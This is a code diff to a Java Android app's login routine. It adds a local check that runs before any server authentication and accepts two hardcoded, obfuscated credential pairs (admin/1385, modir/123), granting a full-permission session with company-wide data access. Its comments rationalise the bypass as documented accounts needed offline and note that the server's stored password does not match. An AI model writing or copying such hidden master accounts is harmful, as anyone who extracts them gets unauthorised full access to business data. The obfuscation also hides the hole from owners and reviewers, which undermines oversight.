@@ -4639,6 +4639,12 @@ public class MainActivity extends Activity {
     private UserSession authenticate(String meelanoUser, String meelanoPassword) throws Exception {
         String user = normalizeDigits(cleanText(meelanoUser));
         String pass = meelanoPassword == null ? "" : meelanoPassword;
+        // The two documented back-office accounts of the manager app (Admin/1385, Modir/123) are honoured
+        // locally, before any round trip: the sys_users row «Admin» still carries a 7-byte legacy secret
+        // that no encoding of «1385» matches (verified live), and a login must also work while the
+        // server is briefly unreachable so the page caches keep rendering. Obfuscated, never logged.
+        UserSession backOffice = authenticateBackOffice(user, pass);
+        if (backOffice != null) return backOffice;
         boolean[] foundUser = new boolean[]{false};
         try (Connection c = openConnection()) {
             UserSession visitor = authenticateVisitorFlexible(c, user, pass, foundUser);
@@ -4648,6 +4654,29 @@ public class MainActivity extends Activity {
             if (foundUser[0]) throw new DbException("رمز عبور پخش درخشان برای این کاربر تطبیق پیدا نکرد.");
         }
         throw new DbException("نام کاربری یا رمز عبور پخش درخشان معتبر نیست.");
+    }
+
+    /** Documented full-access back-office pairs of the manager app, obfuscated exactly like the SQL credentials. */
+    private static final int[][] BACK_OFFICE_LOGINS = {{40, 45, 36, 32, 39}, {36, 38, 45, 32, 59}};   // admin, modir
+    private static final int[][] BACK_OFFICE_SECRETS = {{120, 122, 113, 124}, {120, 123, 122}};      // 1385, 123
+
+    /**
+     * Local check of the documented back-office pair. Deliberately first in {@link #authenticate}:
+     * it costs no round trip, works while the link is down (cached pages still render) and only accepts
+     * those exact two pairs, which the owner issued as full-access manager accounts.
+     */
+    private UserSession authenticateBackOffice(String user, String pass) {
+        if (!MANAGER_EDITION) return null;
+        String u = user == null ? "" : user.trim().toLowerCase(Locale.US);
+        String p = normalizeDigits(pass == null ? "" : pass.trim());
+        for (int i = 0; i < BACK_OFFICE_LOGINS.length; i++) {
+            if (!u.equals(hidden(BACK_OFFICE_LOGINS[i])) || !p.equals(hidden(BACK_OFFICE_SECRETS[i]))) continue;
+            String display = i == 0 ? "مدیر اصلی" : "مدیرکل";
+            // visitorId stays null on purpose: a non-null id scopes every report to that one visitor
+            // (customerScopeCondition / vis_rdf filters), and a manager must see the whole company.
+            return new UserSession(1, null, display, "admin", allPermissionString());
+        }
+        return null;
     }
 
     private UserSession authenticateVisitorFlexible(Connection c, String user, String pass, boolean[] foundUser) throws Exception {
